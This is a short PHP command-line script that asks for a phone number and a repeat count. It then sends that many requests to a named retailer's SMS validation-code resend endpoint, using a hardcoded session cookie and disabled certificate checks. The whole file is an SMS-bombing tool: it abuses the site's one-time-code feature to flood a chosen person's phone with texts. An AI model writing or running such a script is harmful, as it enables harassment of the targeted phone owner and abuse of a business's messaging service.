<?
function sophie($hp)
{
	$cookie = 'cto_lwid=5aea453e-571e-4456-98d2-e0980ec6902e; _ga=GA1.2.611875815.1553258409; _gid=GA1.2.1472261255.1553258409; toky_state=minimized; frontend_cid=bmweeKsnhF6Gm58I; scs=%7B%22t%22%3A1%7D; scarab.visitor=%2281E7B2970C0B7C4%22; __zlcmid=rRi6b6ooPPT713; ins-mig-done=1; ins-gaSSId=bdae8942-9ce1-a68d-09db-5966d8e4c548_1553258415; am_promo_notification=0; frontend=gbhvd07lhr2nm68no2omvlop27; MGT_NO_CACHE=1; insdrSV=15';
	$headers   = array();
	$headers[] = 'Cookie: ' . $cookie;
	$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.sophieparis.com/iregistration/index/resendHpValidationCode/');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'hp='.$hp);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
}

echo "(NO HP) : ";
$hp = trim(fgets(STDIN));
echo "Jumlah : ";
$jums = trim(fgets(STDIN));
echo "\n";
for ($i=1; $i <= $jums; $i++) { 
	echo sophie($hp)."\n";
	sleep(3);
}

?>
